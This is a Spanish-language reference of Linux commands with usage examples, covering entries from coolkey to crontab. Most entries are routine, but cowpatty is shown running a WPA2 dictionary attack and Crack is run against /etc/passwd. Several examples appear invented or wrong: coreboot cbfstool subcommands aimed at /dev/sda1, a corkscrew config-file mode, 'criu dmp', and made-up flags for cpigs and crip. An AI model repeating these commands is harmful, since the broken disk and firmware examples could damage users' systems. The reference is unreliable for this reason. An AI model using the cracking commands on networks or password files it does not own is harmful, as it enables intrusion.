Se utiliza como un middleware para habilitar el soporte de tarjetas inteligentes [smartcards] en aplicaciones basadas en NSS [Network Security Services], como Firefox, Thunderbird, etc. Aunque no es un programa que se ejecute directamente como un comando en la terminal para realizar operaciones específicas, su configuración permite la integración de tarjetas inteligentes con las aplicaciones que lo soportan.
1.-
Configurar Coolkey con Firefox.
Acceder a las preferencias de seguridad [about:preferences] y en la sección Privacidad & Seguridad, Seguridad de dispositivos, cargar, proporcionar nombre para el módulo, como "CoolKey", indicar la ruta al módulo PKCS#11 proporcionado por Coolkey. En Debian, esto suele ser en /usr/lib/x86_64-linux-gnu/pkcs11/libcoolkeypk11.so y guardar. Al insertar la tarjeta inteligente Firefox debería detectar automáticamente la tarjeta bajo la sección Dispositivos de seguridad.
2.-
Configurar Coolkey con Thunderbird
El procedimiento es similar al de Firefox, acceder a Configuración de cuentas, Configuración de seguridad y cargar el módulo PKCS#11 usando la misma ruta que en Firefox.
3.-
Para confirmar que la tarjeta inteligente es compatible, se puede usar opensc
# pkcs11-tool --module /usr/lib/x86_64-linux-gnu/pkcs11/libcoolkeypk11.so --list-slots (listará las ranuras disponibles y debería mostrar detalles de la tarjeta inteligente si está correctamente configurada)
Una vez configurado, cualquier aplicación basada en NSS puede usar el soporte de tarjetas inteligentes para autenticación, firma digital y para iniciar sesión en sitios web que requieran autenticación con certificado.


coop-computing-tools
Colección de software que ayuda a los usuarios a compartir recursos en un entorno informático complejo, heterogéneo y poco fiable. Incluye más de 70 aplicaciones, las principales:
- Parrot: un sistema de archivos virtual personal.
- Chirp: un sistema de almacenamiento y archivos distribuido.
- Makeflow: un motor de flujo de trabajo similar a Make.
- Work Queue: un sistema y una API para crear programas que se escalan hasta miles de procesadores.
- All-Pairs: una abstracción computacional.
- Wavefront: una abstracción computacional para ejecutar problemas de programación dinámica muy grandes.
- Watchdog: un administrador de procesos confiable.
- ftsh: un lenguaje de shell tolerante a fallas.
- FTP-Lite: una biblioteca de cliente FTP liviana.


coproc
Inicia un comando en segundo plano configurando tuberías conectadas a su stdin y stdout para que pueda interactuar con él bidireccionalmente.
$ coproc ls


copy
Carpetas en la nube tipo Dropbox. Entrar en <http://www.copy.com> despues de registrarse y logearse, clicar en la pestaña "Install App" con lo que se nos descargará la aplicacion de escritorio.
$ tar -zvxf copy_agent-1.28.0657.tgz
$ cd copy/x86_64/
$ ./CopyAgent --install (Donde pondremos nombre de usuario y contraseña del registro y carpeta a compartir. Por defecto Copy)
$ ./CopyConsole (Forzar actualizaciones)


copyright-update
Actualizar la información de copyright en un conjunto de archivos.
# cd /usr/bin
# copyright-update -t * (test sobre el año del directorio /usr/bin)
# copyright-update -v -r -t * (con más información y de forma recursiva)


coreboot-utils
Proyecto de software libre cuyo objetivo es reemplazar el BIOS [firmware] propietario que se encuentra en la mayoría de las computadoras. Cuidado al modificar el firmware, ya que puede afectar la funcionalidad del sistema.
# cbmem -l (muestra información detallada del sistema, incluyendo la memoria y los dispositivos)
# cbfstool /dev/sda1 add-lpc-devices /usr/share/coreboot/3rdparty/lpc-devices.bin (agrega los dispositivos LPC al firmware)
# cbmem -l | grep "LPC" (muestra la configuración del chipset LPC)
# cbfstool /dev/sda1 create-image /usr/share/coreboot/3rdparty/romstage.bin (crea una imagen de ROMStage en el dispositivo especificado)
# cbfstool /dev/sda1 dump -b 0x10000 0x200000 (muestra los datos del firmware en el rango especificado)
# flash-kernel --kernel=/path/to/kernel --ramdisk=/path/to/initrd (actualiza el kernel y el initrd en el firmware)


corekeeper
Diseñado para gestionar de manera eficiente los archivos de núcleo [core dumps] generados por aplicaciones que se bloquean. A pesar de no tener un ejecutable, realiza su función principalmente en configuraciones automáticas del sistema o a través de scripts. Informa de fallas y elimina archivos de núcleo antiguos después de 7 días.
$ systemctl status corekeeper (verificar si está activo)
$ journalctl -u corekeeper (verificar el comportamiento de los logs del servicio)


corelist
Proporciona información sobre los módulos core y dual-life incluidos en cada versión de perl.
$ corelist -v (enumera todas las versiones de perl)
$ corelist -r (lista todas las versiones de perl y cuándo se publicaron)
$ corelist -a Unicode (lista todas las versiones del módulo dado)
$ corelist --utils -v 5.8.3 (De la version)


coreutils
Contiene las utilidades básicas de manipulación de archivos, shell y texto que se espera que existan en todos los sistemas operativos. Incluye más de 100 aplicaciones [chroot, cat, chgrp, chmod...]


corkscrew
Herramienta para tunelar conexiones TCP a través de un proxy HTTP compatible con el método CONNECT. Lee la entrada estándar y escribe en la salida estándar durante la conexión, al igual que netcat. Se puede utilizar, por ejemplo, para conectarse a un servidor SSH que se ejecuta en un puerto 443 remoto a través de un proxy HTTPS estricto.
$ corkscrew proxy.example.com 8080 host.example.com 80 (intentará establecer una conexión a host.example.com sobre puerto 80, pero primero pasará por el proxy proxy.example.com en puerto 8080)
$ ssh -o PrxyCommand="corkscrew proxy.example.com 8080 %h %p" user@remote_host (conectando a un servidor SSH usando corkscrew)
$ openssl s_client -connect example.com:443 | corkscrew proxy.example.com 8080 - (usando corkscrew con SSL/TLS)
1.-
Configurando corkscrew:
# nano /etc/corkscrew.conf
Y colocar las lineas:
          [Proxy]
           Host = proxy.example.com
           Port = 8080
          [Target]
           Host = target.example.com
           Port = 443
Luego puede usarae así:
$ corkscrew /etc/corkscrew.conf


cow-shell
[cowdancer]. Invoca una sesión de shell, bajo el directorio en el que se invocó la aplicación. Durante esta sesión, cualquier modificación que se realice en los archivos o directorios dentro del entorno de trabajo se lleva a cabo en una copia temporal de los archivos, en lugar de modificarlos directamente. Esto se logra a través de la técnica de Copy on Write [COW] que permite trabajar con archivos y directorios sin riesgos de perder datos o corromper los originales.


cowbuilder
[cowbuilder pbuilder debootstrap cowdancer]. Herramienta que actúa como contenedor para pbuilder aplicación que crea un entorno aislado [chroot] para construir paquetes Debian, pero con soporte para cowdancer, una herramienta que usa copias en escritura [copy-on-write] para optimizar la creación y manipulación de entornos de construcción [chroo]).
# mkdir -p /var/cache/pbuilder (configurar un entorno base que se usará como plantilla para construir paquetes)
# cowbuilder --create --basepath /var/cache/pbuilder/base.cow --distribution bookworm --architecture amd64 (Ruta donde se almacenará el entorno base, distribución de Debian y arquitectura para el entorno)
# cowbuilder --build nombre_paquete.dsc --basepath /var/cache/pbuilder/base.cow (descargará todas las dependencias necesarias y compilará el paquete en el entorno aislado)
# cowbuilder --update --basepath /var/cache/pbuilder/base.cow (mantener el entorno actualizado con las últimas dependencias y paquetes)
# cowbuilder --login --basepath /var/cache/pbuilder/base.cow (dará acceso a un entorno chroot limpio donde se puede instalar y probar el paquete con dpkg -i paquete.deb)
# cowbuilder --create --basepath /var/cache/pbuilder/base-arm64.cow --distribution bookworm --architecture arm64 (construyendo paquetes para una arquitectura diferente por ejemplo, arm64)
# cowbuilder --build nombre_paquete.dsc --basepath /var/cache/pbuilder/base-arm64.cow (construir paquetes para esa arquitectura)
# cowbuilder --clean --basepath /var/cache/pbuilder/base.cow (si ocurre algún error durante la construcción o se quiere limpiar el entorno)
El comportamiento de cowbuilder puede personalizarse mediante un archivo de configuración, por ejemplo:
$ nano ~/.pbuilderrc
# Ruta al entorno base
BASETGZ=/var/cache/pbuilder/base.cow
# Distribución por defecto
DISTRIBUTION=bookworm
# Espejo para descargar paquetes
MIRRORSITE=http://deb.debian.org/debian
Guardar y cowbuilder usará estas configuraciones por defecto.


cowpatty
Aplicación de ataque de diccionario contra contraseñas WPA2.
$ cowpatty -f diccionario -r ataque.cap -s SSID (lista de palabras a usar, guardar en el archivo expecificado y el SSID encontrado)


cowsay
Muestra figuras en consola
$ cowsay -l      (muestra todas las posibilidades de figuras)
$ cowsay -f tux Esto es linux
$ echo “linux” | cowsay -n | cowsay -n | cowsay -n (Anidando las figuras)


cowsay-off
Esta aplicación aumenta las opciones de cowsay [ver] con una mayor cantidad de criaturas, algunas de las cuales son: ponys, el demonio BSD, dragones, canguros, pavos hasta un elefante o una serpiente.
$ cowsay -l (nuevo listado ampliado de cowsay)
$ cowsay -f vader-koala Esto es linux


cowthink
Vaca pensando.
$ cowthink -p ¿¿Linux??


cp
Copiar archivos
$ cp -r  (Copia archivos y directorios de forma recursiva)
$ cp -i   (Pide confirmacion antes de sobreescribir)
$ cp -f   (Borra el archivo de destino sin preguntar)
$ cp -u  (copia sólo cuando el archivo de origen es más reciente que el archivo de destino o cuando el archivo destino falta)
$ cp -p  (Copiar conservando los permisos de usuario y grupo)
$ cp archivo{,.back} (Hará una copia .back del archivo)
	$ cp archivo archivo.$$ ("$$" es una variable de la shell que contiene el pid)


cpaldjvu
Convierte documentos pdf o imagenes a formato djvu
$ cpaldjvu -colors 5 -dpi 50 -verbose entrada.jpg salida (especificando colores [por defecto 256] y resolución [entre 25 y 6000.Por defecto 300])


cpan-listchanges
es una aplicación de línea de comandos que compara el archivo de cambios entre versiones arbitrarias de un paquete. Es similar a apt-listchanges y, de forma predeterminada, compara la versión instalada actualmente con la última versión disponible en CPAN.
$ cpan-listchanges paquete_instalado (comparará la versión actualmente instalada del paquete con la última versión disponible en CPAN)
$ cpan-listchanges nombre_del_paquete 1.0.0 1.1.0 (comparará la versión 1.0.0 con la versión 1.1.0 del paquete)
$ cpan-listchanges nombre_del_paquete 2.5.0 (comparará la versión actual con la versión 2.5.0 disponible en CPAN)


cpanminus
script para obtener, descomprimir, compilar e instalar módulos PERL desde CPAN.
$ cpanm Moose (descargará y compilará el módulo Moose desde CPAN)
$ cpanm Moo::Role JSON::Maybe (instalará los módulos Moo::Role y JSON::Maybe)
$ cpanm --force Some::Module (forzará la recompilación del módulo incluso si ya está instalado)
$ cpanm https://cpan.metacpan.org/authors/id/C/CH/CHOCOLATE/Some-Module-0.01.tar.gz (instalar desde una URL específica)
$ cpanm --look Some::Module (mostrará información sobre el módulo sin instalarlo)
$ cpanm --quiet Some::Module (instalar en modo silencioso)
$ cpanm -i Some::Module (instalar en modo interactivo)


cpanoutdated
Imprime la lista de módulos CPAN obsoletos en su máquina. Este script se puede integrar con el comando cpanm.
$ cpanoutdated


cpants_lint
Herramienta utilizada para analizar la calidad de una distribución de Perl CPAN antes de cargarla. El objetivo principal es identificar problemas y mejorar la calidad de un paquete antes de su publicación en CPAN.
$ cpants_lint My-Module-1.0.tar.gz (mostrará un informe detallado sobre la calidad del paquete)
$ cpants_lint /ruta/a/mi/modulo/ (Si se está desarrollando un módulo y con los archivos sin comprimir en un directorio, analizarlo directamente)
$ cpants_lint --json My-Module-1.0.tar.gz (generar un informe en formato JSON)
$ cpants_lint Module1-0.1.tar.gz Module2-0.2.tar.gz /ruta/a/otro/modulo/ (analizar varios archivos o directorios a la vez)
1.-
Si se está desarrollando un módulo, se puede empaquetar primero con make dist o similar y luego verificarlo:
$ perl Makefile.PL
$ make dist
$cpants_lint My-Module-1.0.tar.gz
Una salida típica podría incluir lineas como:
      Checking prerequisites... OK
      Checking for README... MISSING
      Checking for META.yml... OK
      Checking POD coverage... OK
      Checking for tests... OK
Cada elemento indica si cumple con las expectativas de calidad. Los elementos marcados como "MISSING" o "FAIL" requieren atención.


cpdb-backend-file
Es parte del ecosistema de OpenPrinting y se utiliza como backend para gestionar la impresión en archivos desde aplicaciones que implementan Common Print Dialog Backends [CPDB].
$ cpdb-backend-file (ejecutará el backend y lo hará disponible para cualquier diálogo de impresión que lo soporte)
$ DEBUG=1 cpdb-backend-file (generará un log más detallado que puede ser útil para diagnosticar problemas en la integración con aplicaciones)
$ cpdb-list (comprobar qué backends están disponibles en el sistema para los diálogos de impresión incluirá cpdb-backend-file si está correctamente instalado y en funcionamiento)
Nota.- Es un componente backend que no se utiliza directamente en la línea de comandos más allá de iniciarlo, las aplicaciones como LibreOffice o cualquier software que use CPDB lo detectarán automáticamente.


cpigs
[cruft-ng]. Herramienta que proporciona información sobre los paquetes más volátiles de un sistema Debian. Su principal propósito es identificar paquetes que están cambiando con frecuencia, como los relacionados con apt, plocate, entre otros, para ayudar a realizar análisis de estado del sistema o depuración.
$ cpigs (muestra una lista de los paquetes más volátiles en el sistema, ordenados por actividad)
$ cpigs -n 10 (limitar la salida a un número específico de paquetes)
$ cpigs -o paquetes_volatiles.csv (genera un archivo CSV con datos sobre los paquetes volátiles, que puede usarse para análisis posterior)
$ cpigs | grep apt (filtrar para concentrarse en ciertos paquetes)
$ cpigs --dump-state (volcar todo el estado interno en la terminal)
$ cpigs | sort -k2 -n -r | head -n 10 (encontrar los paquetes con los valores más altos de actividad)


cpio
[CoPy In, copy Out]. Utilidad que se utiliza para procesar archivos comprimidos.
$ ls *.txt | cpio -ocv -O archivo.cpio (Creará [-o] "archivo.cpio" [-O] con todos los .txt del directorio, mostrando toda la salida [-v] y que escriba la información del encabezado en ASCII para facilitar el traspaso entre plataformas)
$ cpio -icv < archivo.cpio (Extraer el contenido)
$ cpio -itu < file.cpio > indice (Crear un indice con el contenido de un archivo cpio y sobreescribir si existe)
$ find ~/Documents/emacs -type f > listado.txt (crear un archivo cpio desde una lista de archivos)
$ cpio -ovd < listado.txt > salida.cpio (extrae con la misma estructura de directorio, si así se creó el fichero)
$ cpio -idv < salida.cpio (extraer archivos de un archivo cpio)
$ find ~/Documents/emacs -type f | cpio -pdm ~/emacs (copiar archivos de un directorio a otro)
$ find . -type f | cpio --create --format=cpio > archivo.cpio.gz (comprimir archivos)
$ gunzip -c arhivo.cpio.gz | cpio --extract --make-directories (descomprimir)
$ cpio -F backup.tar.recovered -i -v (extraer contenido de un archivo .tar aunque contenga errores y modo verbose)


cpipe
Herramienta útil para medir el rendimiento de las operaciones de entrada/salida (I/O) en una tubería. Toma la entrada estándar, la copia a la salida estándar y proporciona estadísticas como el tiempo de lectura/escritura y el rendimiento en términos de velocidad en bytes por segundo.
$ cat archivo_grande | cpipe -vt > /dev/null (medir la velocidad de copia de un archivo grande, -v: muestra estadísticas [velocidad, tiempo, etc.] en la salida estándar de error y -t: muestra estadísticas acumuladas al final)
$ cat archivo_grande | cpipe -vt | gzip > archivo_grande.gz (muestra el rendimiento durante la compresión del archivo)
$ curl -s http://example.com/archivo_grande | cpipe -vt > archivo_grande (muestra cuánto tiempo toma recibir los datos)
$ dd if=/dev/sdX bs=1M | cpipe -vt > /dev/null (muestra la velocidad de lectura desde el dispositivo /dev/sdX)
$ cat archivo_grande | cpipe -b 64k -vt > /dev/null (usa un búfer de 64 KB en lugar del tamaño predeterminado de 4 KB)
$ cp archivo_grande /ruta/destino | cpipe -vt (copiar un archivo de un directorio a otro y medir el rendimiento)
$ cat /dev/zero | cpipe -vt > archivo_prueba (crea un archivo de prueba con datos generados, mientras mide la velocidad de escritura)
$ cat archivo_grande | cpipe -u 1 -vt > /dev/null (actualiza las estadísticas cada segundo)
Nota.- cpipe genera estadísticas en la salida estándar de error. Por ejemplo:
       bufcount: 1024, readtime: 0.123s, writetime: 0.145s, bytes: 1048576, bytes/sec: 7340032
Con los siguientes significados:
        bufcount: Número de búferes procesados.
        readtime: Tiempo total de lectura.
        writetime: Tiempo total de escritura.
        bytes: Cantidad total de bytes procesados.
        bytes/sec: Velocidad promedio de transferencia.
Otro ejemplo:
$ find /usr -iname network | cpipe -vr -vw -vt > /dev/null (mostrar tiempos de lectura, escritura y rendimiento y los demás datos a /dev/null)
	in: 887.446ms at     720B/s (    720B/s avg)     639B   (bsize=639)
	out:   0.002ms at  304.7MB/s ( 304.7MB/s avg)     639B
	thru: 887.496ms at     720B/s (    720B/s avg)     639B


cplay-ng
Reproductor de música minimalista con una interfaz de usuario textual escrita en Python. En lugar de crear una base de datos elaborada de la biblioteca de música, cplay permite explorar el sistema de archivos y poner en cola archivos, directorios y listas de reproducción.
$ cplay-ng


cpm
Gestor de contraseñas que utiliza una interfaz en curses [modo texto] que utiliza cifrado PGP. Herramienta para gestionar contraseñas y almacenarlas cifradas con clave pública en un archivo. Los datos se almacenan como XML comprimido zlib. El software utiliza CDK [ncurses] para gestionar la interfaz de usuario, libxml2 para almacenar la información, la biblioteca zlib para comprimir los datos y la biblioteca GpgMe para cifrar y descifrar los datos de forma segura.
Configuración previa. Si no se tiene ninguna clave pública, crear una:
$ gpg --full-generate-key
$ gpg --list-keys (para obtener la clave pública si ya se tiene)
$ export CPM_KEYID="TU_KEY_ID" (Sustituir TU_KEY_ID por el ID de la clave pública obtenida con el comando anterior)
$ cpm --configtest (verificar el archivo de configuración)
$ cpm (abre la interfaz donde se puede agregar, buscar, editar y eliminar entradas de contraseñas)


cpu
Herramienta de administración de usuarios LDAP [Lightweight Directory Access Protocol - protocolo ligero de acceso a directorios]. Archivo de configuración en /etc/cpu/cpu.conf
# cpu -m ldap (la otra opción es "passwd")


cpu-checker
Herramientas para ayudar a evaluar ciertas características de la CPU o BIOS. Hay algunas características de la CPU que están filtradas o deshabilitadas por la BIOS del sistema. Este conjunto de herramientas busca ayudar a identificar cuándo ciertas características se encuentran en este estado, en función de los valores del kernel, los indicadores de la CPU y otras condiciones.
# check-bios-nx --verbose (determinar si el BIOS ha bloqueado las capacidades NX de la CPU)
         ok: the NX bit is operational on this CPU.
# kvm-ok (si el sistema es capaz de ejecutar máquinas virtuales KVM aceleradas por hardware es decir, posee tecnología de virtualización)
         INFO: Your CPU does not support KVM extensions
         KVM acceleration can NOT be used


cpufetch
Muestra información de la CPU con el logotipo del fabricante de la CPU.
$ cpufetch


cpufreq-info
Obtiene información del estado del demonio cpufreqd así como información de la CPU.
$ cpufreq-info (toda la información de las CPUs)
$ cpufreq-info -o (imprime información como la proporcionada por la interfaz /proc/cpufreq)
$ cpufreq-info -p (obtiene la política cpufreq utilizada actualmente)
$ cpufreq-info -d (determina el controlador del kernel cpufreq utilizado)


cpufreq-selector
Permite definir el perfil de la CPU powersave, performance, conservative, userspace, ondemand así como la velocidad y otros parámetros
$ cpufreq-selector -g powersave -c 0 (Define perfil powersave para el nucleo 0)
$ cpufreq-selector -f 1200000 (Define la velocidad exacta de la CPU, en Khz)


cpufreq-set
Define el perfil de la CPU [powersave, performance, conservative, userspace, ondemand] así como la velocidad y otros parámetros
# cpufreq-set --governor powersave (Define el perfil de velocidad de la CPU. Perfiles disponibles: conservative, powersave, performance, ondemand, userspace)
# cpufreq-set -c 0 (Definimos que queremos aplicar el comando a la CPU 0. Si se omite, por defecto tomará este valor. El rango de este valor va de 0 a N-1 CPUs. Por ejemplo con 4 núcleos iria de 0 a 3)
# cpufreq-set --min 1200000 –governor PERFIL (define la velocidad mínima del procesador en Hz para el perfil seleccionado, requiere el uso de la opción --governor. En caso de que el valor sea inferior al permitido, se utiliza la velocidad mínima soportada por la CPU. Si tenemos más de una CPU o núcleo, debemos repetir el comando para cada CPU con la opción -c e indicar el número de esta)
# cpufreq-set --max 2101000 --governor ondemand (lo mismo que –min pero con la velocidad máxima de la CPU)
# cpufreq-set -f 1600000 (Especificamos que queremos que la CPU trabaje a la velocidad deseada. Requiere que estemos usando el perfil userspace)


cpuid
Muestra el IP del proveedor, caracteristicas del procesador, información de caché, etc de procesadores Intel y AMD x86. No tiene opciones.
$ cpuid


cpuinfo
Biblioteca para detectar información del rendimiento de la CPU. Incluye las aplicaciones: cache-info, cpu-info, cpuid-dump y isa-info.
# cache-info
# cpu-info
# cpuid-dump
# isa-info
# watch -n1 "grep 'cpu MHz' /proc/cpuinfo" (refresca cada segundo la frecuencia real de cada núcleo de la CPU)


cpulimit
Limitar el uso de la cpu para determinados procesos.
# cpulimit -e yes -l 20 (el de “yes”a un 20% de la cpu. Valor entre 0 y 100)
# cpulimit -p PID -l 50 (el proceso con el numero PID al 50%)


cpustat
Información periódicamente sobre la utilización de la CPU.
$ cpustat -l (Información extendida)
$ cpustat -p PID (sobre un PID)
$ cpustat -a
$ cpustat -i
$ cpustat -t root (Sobre un usuario)
$ cpustat -n 20 (muestra los 20 procesos principales que se ejecutan en el sistema)


cputool
Limita el uso del CPU de un proceso.
$ cputool -c 50 -p 15352 (Al 50% para el PID 15352)


crack
Programa para localizar vulnerabilidades en archivos de contraseñas escaneando los contenidos y buscando usuarios que hayan elegido una contraseña de inicio de sesión débil.
# Crack -nice 10 /etc/passwd (con prioridad reducida para que otros programas tengan prioridad sobre la cpu. El ejecutable va con C mayuscula)


cracklib
(libcrack2) Verifica la fortaleza de una contraseña, procesa archivos de palabras, crea bases de datos, etc. El paqueta contiene varias herramienta: cracklib-chec, cracklib-format, cracklib-packer, cracklib-unpacker y update-cracklib.
Mide la fortaleza de una contraseña.
	$ echo "LinUx_f1nt1stic0" | cracklib-check
	LinUx_f1nt1stic0: OK
	$ echo "linux12" | cracklib-check
	linux12: it is based on a dictionary word
Puede usar el modo interactivo:
	$ cracklib-check
	54321
	54321: it is too short
	linux2
	linux2: it is based on a dictionary word
	HueñPP9-?"HgfR
	HueñPP9-?"HgfR: OK
# update-cracklib (actualizar los diccionarios de la aplicación)
# cracklib-format datos (convierte cada linea en una palabra independiente de las que tenga y las coloca por orden alfabetico)
# cracklib-format datos > datos2 (lo anterior mandándolo a un archivo)


crash
Herramienta de depuración diseñada para analizar volcados de memoria del núcleo y sistemas en ejecución.
$ crash /usr/lib/debug/boot/vmlinux-$(uname -r) /var/crash/2025-01-01-12:34/vmcore (volcado de memoria especificando ruta al binario de depuración del núcleo y archivo de volcado de memoria generado por kexec o una herramienta similar)
Dentro de la interfaz de crash:
> ps (listar todas las tareas en ejecución)
> struct task_struct 0xffff88007b7c0400 (inspeccionar una estructura task_struct específica usando la dirección de memoria)
> bt 1234 (ver el backtrace de una tarea específica con su PID)
> mod (listar todos los módulos del núcleo cargados)
> files 0xffff88007b7c0400 (examinar los archivos abiertos por un proceso)
> rd -p 0xffff88007b7c0400 (inspeccionar regiones específicas de memoria. -p: Lectura física y 0xffff88007b7c0400: Dirección de memoria)
> kmem -i (mostrar información del sistema, incluyendo memoria física, memoria de intercambio y zonas de memoria relacionada con el uso de memoria)
> disassemble schedule (desensamblar una función)
> disassemble 0xffffffff81012345 (desensamblar una dirección específica)
> exit (salir del programa)


crashme
Aplicación que se basa en una serie de script que escribirán código aleatorio en secciones aleatorias de la memoria para ver qué tal responde el sistema operativo y poder detectar posibles fallos, vulnerabilidad o simplemente comprobar qué tal responde a escrituras forzadas en secciones de la memoria utilizadas. Por defecto los tests de Crashme están limitados a 30 segundos, tras los cuales se cierran y se guardan los registros. Advertencia: Si bien se sabe que el kernel Linux sobrevive días y semanas de crashme, no se garantiza que el sistema sobreviva a varios de estos procesos.
# crashme +2000 666 50 00:02:00 2 (2 minutos de proceso, mostrar información resumida del proceso)
$ crashme-- --bytes=1024 --seed=666 --worker (modo de trabajo)
$ crashme-- --bytes=1024 --seed=666 --fork=4 (modo supervisor  que genera una cantidad específica de elementos secundarios en el modo de trabajo)


create-cracklib-dict
[cracklib-runtime]. Toma uno o más archivos de listas de palabras como argumentos, una por linea y los convierte en diccionarios de cracklib.
# create-cracklib-dict archivo


cricket
Es un motor de configuración, sondeo y visualización de datos integrado en la herramienta RRD. Consta de tres partes visibles para el usuario: cricket-compile [compila el árbol de configuración de Cricket [en /etc/cricket] en el formato leído por el recopilador. Normalmente se ejecuta después de editar los archivos en el árbol de configuración. No se necesitan opciones], collector [lee una configuración de /etc/cricket, compilada por el comando cricket-compile y recopila y almacena datos de acuerdo con la información que encuentra allí. Normalmente se ejecuta desde un trabajo cron] y grapher.cgi [muestra los datos recopilados por Cricket en un formato gráfico. Generalmente se accede a él mediante un navegador web en http://localhost/cgi-bin/cricket/grapher.cgi]. Documentación de la aplicación con el navegador abrir /usr/share/doc/cricket/html/index.html.


crip
Herramienta que se utiliza principalmente para trabajar con imágenes de CD y DVD, permitiendo la extracción, codificación y etiquetado. Es ideal para crear muchos archivos a partir de CD y tenerlos todos etiquetados correctamente y con calidad profesional y tener flexibilidad y control total sobre todo. Las versiones actuales de crip solo admiten Ogg Vorbis y FLAC. Permite ajustar el volumen para que sea lo más alto posible sin distorsión/saturación y etiquetado de grupo, lo que facilita que un grupo de pistas se trate como una sola pieza. También puede recortar el silencio al principio y al final de estas pistas/grupos.
$ crip -e /dev/cdrom ~/Videos/salida (extraer todos los archivos de un CD y guardarlos en un directorio específico)
$ crip -e -t /dev/cdrom ~/Videos/salida (extraer archivos de un CD y etiquetarlos automáticamente)
$ crip -c ~/Videos/original ~/Videos/codificado (codificar un archivo, por ejemplo, convertir a otro formato)
$ crip -l /dev/cdrom (listar los archivos que están en un CD sin extraerlos)
$ crip -e -f *.mp3 /dev/cdrom ~/Videos/salida (extraer archivos de un tipo específico, por ejemplo, solo archivos .mp3)


criu
contiene las utilidades para realizar puntos de control [checkpoint] y restaurar procesos.
# criu dmp -D checkpoint -t <PID> (realiza un punto de control del proceso <PID> y guarda los archivos de imagen en la carpeta checkpoint)
# criu restore -D checkpoint (restaurar un proceso desde un punto de control)
# criu check (verifica si el kernel es compatible con las funcionalidades necesarias)
# criu --unprivileged <comando> (ejecutar como usuario no privilegiado)
1.-
Usar un script de acción personalizado:
# criu dmp --action-script pre-dump post-dump <PID>
# criu restore --action-script pre-restore post-restore


crmsh
Este shell es una interfaz avanzada para la administración de clústeres de alta disponibilidad [HA]. También proporciona funciones avanzadas como configuración de clústeres de bajo nivel, administración de paquetes y scripts de clústeres y herramientas de exploración del historial que brindan una vista instantánea de lo que está haciendo el clúster.
$ crm (abrirá el shell interactivo, donde se puede ejecutar comandos para administrar y monitorear el clúster)
$ crm cluster init --name mi_cluster (inicializa un nuevo clúster con el nombre mi_cluster y configura automáticamente los servicios de alta disponibilidad)
$ crm cluster join --node nodo2 (agrega un nodo llamado nodo2 al clúster existente)
$ crm configure primitive mi_recurso ocf:heartbeat:IPaddr2 params ip=192.168.1.100 cidr_netmask=24 op monitor interval=30s (define un recurso de alta disponibilidad para la dirección 192.168.1.100 utilizando el agente IPaddr2)
$ crm configure group mi_grupo recurso1 recurso2 recurso3 (crea un grupo de recursos llamado mi_grupo que contiene los recursos recurso1, recurso2 y recurso3 que se gestionan conjuntamente)
$ crm configure location pref_mi_recurso mi_recurso 100: nodo1 (configura una preferencia para que el recurso mi_recurso se ejecute en el nodo nodo1 con una puntuación de 100)
$ crm status (muestra el estado actual del clúster, incluyendo nodos, recursos y su estado)
$ crm resource stop mi_recurso (detiene el recurso mi_recurso)
$ crm configure save archivo_config.crm (guarda la configuración actual del clúster en un archivo llamado archivo_config.crm)
$ crm configure load replace archivo_config.crm (carga y reemplaza la configuración actual del clúster con la configuración guardada en archivo_config.crm)
$ crm configure delete mi_recurso (elimina el recurso llamado mi_recurso del clúster)
$ crm history (muestra un resumen histórico de los eventos recientes del clúster)
$ crm_mon -1 (muestra el estado del clúster una sola vez en formato legible)
$ crm cluster upgrade (actualiza todos los nodos del clúster)
Nota.- "exit" para salir del shell de cmr


cron
Demonio de programación de procesos. Este demonio es un proceso en segundo plano que ejecuta programas específicos en momentos específicos, por ejemplo, cada minuto, día, semana o mes, como se especifica en un crontab [ver].
$ systemctl status cron.service (saber si está activo)


cron-apt
Herramienta que ejecuta un trabajo cron a intervalos regulares. Por defecto, solo actualiza la lista de paquetes y descarga nuevos paquetes sin instalar. Puede indicarle que ejecute cualquier cosa que pueda hacer con apt-get o aptitude. Editar el archivo:
# nano /etc/cron-apt.conf
Y modificar las lineas:
	MAILON="always"
	MAILTO="usuario@example.com"
# cron-apt (comprobar que el software se ejecute sin problemas)
Para comprobar los logs en el archivo /var/log/cron-apt/log


cronic
Contenedor para trabajos de Cron. Chronic administra el resultado de otros programas y los organiza para mostrar solo ese resultado si el comando tiene un error o falla. Si el comando tiene éxito, se ocultará cualquier otra salida y eso significa que no habrá correo electrónico. Sólo se recibe un correo electrónico si no funciona. Un ejemo de estilo podria ser:
$ crontab -e
Añadir el script que se ejecutaria, por ejemplo, en cada reinicio:
	@reboot cronic script.sh
Pera comprobar si se ejecuta correctamente podemos realizar una prueba. Modificamos el crontab con un script que no existe:
$ crontab -e
Añadimos:
	@reboot cronic scrit.sh
Recibiremos un correo con algo parecido a "Cron <usuario@localhost> chronic scrit (failed)"


cronolog
Rotador de archivos de registro para servidores web. Lee mensajes desde su entrada y los escribe en un conjunto de archivos de salida, cuyos nombres se construyen utilizando una plantilla y la fecha y hora actuales. La plantilla utiliza los mismos especificadores de formato que el comando date de Unix. Incluye la aplicación cronosplit.
$ servidor_web | cronolog /var/log/webserver/%Y/%m/%d/access.log (creará un archivo de registro en la ruta /var/log/webserver/ con una estructura de carpetas organizada por año [%Y], mes [%m] y día [%d] sel servidor web especificado)
$ servidor_web | cronolog /var/log/webserver/%Y/%m/%d/%H.log (creará un archivo nuevo para cada hora, con una estructura como: /var/log/webserver/2025/01/11/14.log [para las 14:00 del 11 de enero de 2025])
$ servidor_web | cronolog /var/log/webserver/%Y/week-%U.log (creará archivos basados en el número de la semana (%U) del año [/var/log/webserver/2025/week-02.log])
$ servidor_web | cronolog /var/log/webserver/prefix-%Y%m%d.log (agregar un prefijo personalizado a los nombres de archivo [/var/log/webserver/prefix-20250111.log])
$ servidor_web | cronolog /var/log/webserver/%Y/%m/%d/%H-%M.log (dividir los registros en intervalos de 10 minutos [/var/log/webserver/2025/01/11/14-50.log para registros de las 14:50])
$ servidor_web | cronolog /var/log/webserver/%Y/%m/%d/access.log | gzip > /var/log/webserver/%Y/%m/%d/access.log.gz (combinar con una herramienta de compresión como gzip para ahorrar espacio en disco)
1.-
Para un servidor Apache, se puede usar cronolog en el archivo de configuración [/etc/apache2/apache2.conf] para manejar los registros de acceso o error. Por ejemplo añadiendo/modificando las lineas:
       CustomLog "|/usr/bin/cronolog /var/log/apache2/%Y/%m/%d/access.log" combined
       ErrorLog "|/usr/bin/cronolog /var/log/apache2/%Y/%m/%d/error.log"
Nota.- El formato de tiempo, resumido es:
       %Y - Año (2025)
       %m - Mes (01)
       %d - Día (11)
       %H - Hora (14)
       %M - Minuto (50)
       %U - Número de la semana del año (02)


crontab
